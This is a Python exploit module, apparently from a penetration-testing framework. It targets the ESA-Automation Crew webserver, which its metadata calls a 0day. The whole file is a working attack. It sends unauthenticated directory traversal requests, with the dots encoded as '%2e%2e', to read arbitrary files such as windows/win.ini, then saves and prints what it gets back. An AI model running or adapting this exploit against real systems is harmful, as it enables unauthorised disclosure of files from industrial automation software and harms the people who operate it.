#!/usr/bin/env python

import urllib2

from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = 'efs_esa_automation_crew_webserver_dir_trav'
INFO['DESCRIPTION'] = 'ESA-Automation Crew Webserver Directory Traveral'
INFO['VENDOR'] = 'https://www.esa-automation.com/en/products/crew/'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'https://www.esa-automation.com/en/category-downloads/'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '28 Feb 2018'
INFO['PATH'] = 'Web/'
INFO['NOTES'] = """Vulnerability allows remote attackers to disclose files.
Authentication is not required to exploit this vulnerability.
Tested against Crew 02.00.174 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.103'
OPTIONS['PORT'] = 8080
OPTIONS['FILENAME'] = '../../../../../../../../../../windows/win.ini'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.filename = self.args.get('FILENAME', OPTIONS['FILENAME'])

    def make_url(self, path=''):
        url = 'http://%s:%s/%s' % (self.host, self.port, path)
        return url

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url()
        self.log('[*] Checking connection to %s' % url)
        urllib2.urlopen(url)
        self.log('[*] Trying to disclose "%s"' % self.filename)
        self.filename = self.filename.replace('\\', '/').replace('..', '%2e%2e')
        url = self.make_url(self.filename)
        try:
            res = urllib2.urlopen(url).read()
        except urllib2.HTTPError as e:
            if e.code == 404:
                self.log('[-] File not found')
                self.finish(False)
        self.writefile(res, self.filename.split('/').pop())
        if len(res) < 10000:
            self.log('[+]\r\n' + res)
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()